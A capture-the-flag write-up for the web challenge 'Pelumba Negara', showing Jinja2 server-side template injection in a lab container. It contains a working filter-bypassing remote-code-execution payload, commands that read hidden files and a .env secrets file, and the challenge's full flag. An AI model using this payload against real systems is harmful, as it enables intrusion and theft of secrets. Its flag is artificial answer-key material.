---
slug: "local-ctf/bahtera-3108-2025/pelumba-negara"
event: "bahtera-3108-2025"
title: "Pelumba Negara"
summary: "Bahtera 3108 2025 web writeup for Pelumba Negara, using Jinja2 server-side template injection to enumerate files and assemble flag fragments."
date: 2025-08-30
tags:
  - ctf
  - bahtera-3108
  - web-exploitation
  - ssti
  - jinja2
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
---

# Challenge Overview

- **Challenge:** Pelumba Negara
- **Category:** Web
- **Points:** 100

> Arkib digital ini telah dibangunkan untuk pemandu F1 pertama Malaysia. Walau bagaimanapun, sistem ini ada kelemahan dan dapatkah anda untuk mengumpul semua serpihan maklumat bersejarah yang disembunyikan?

The source recorded this temporary container endpoint:

```text
Host: 5.223.66.228
Port: 33429/tcp
URL: http://5.223.66.228:33429/
```

![Pelumba Negara challenge page](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/challenge-page.png)

## Identify Server-Side Template Injection

The application was tested using guidance from PortSwigger's [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) material.

![SSTI detection reference](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/ssti-detection-reference.png)

![Jinja2 test result](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/jinja2-test-result.png)

The payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2, allowing the template engine to be distinguished.

## Execute Commands

The source used the following Jinja2 payload. The hexadecimal escapes spell the double-underscore attributes while avoiding direct underscore filtering:

```text
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

![SSTI command execution](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/command-execution.png)

The `id` command returned:

```text
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

Replace `id` with `ls` to enumerate the current directory.

![Directory listing](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/directory-listing.png)

Replacing `ls` with `cat flag.txt` returned file content containing a Base64 string.

![Contents of flag.txt](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/flag-file-content.png)

Decoding it produced the decoy `3108{Bendera_Palsu}` with a warning that not everything was visible.

![Decoded decoy flag](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/decoy-flag-result.png)

After several attempts, the real flag was still not visible. Run `ls -lah` to include hidden files.

![Hidden file listing](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/hidden-file-listing.png)

Replace `ls -lah` with `cat .env` to inspect the environment file.

![Environment file contents](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/environment-file.png)

The files referenced by the environment variables were then read to collect all three flag fragments.

```text
f1rst_M4l4ysi4n_F1_dr1v3r}
```

![First recovered flag fragment](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/flag-fragment-01.png)

```text
_p3nt4s_duni4_Alex_Y00ng_
```

![Second recovered flag fragment](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/flag-fragment-02.png)

```text
3108{d4r1_Ku4l4_Lumpur_k3
```

![Third recovered flag fragment](/images/writeups/local-ctf/bahtera-3108-2025/pelumba-negara/flag-fragment-03.png)

Putting the fragments in their correct order produces the complete flag.

## Flag

```text
3108{d4r1_Ku4l4_Lumpur_k3_p3nt4s_duni4_Alex_Y00ng_f1rst_M4l4ysi4n_F1_dr1v3r}
```
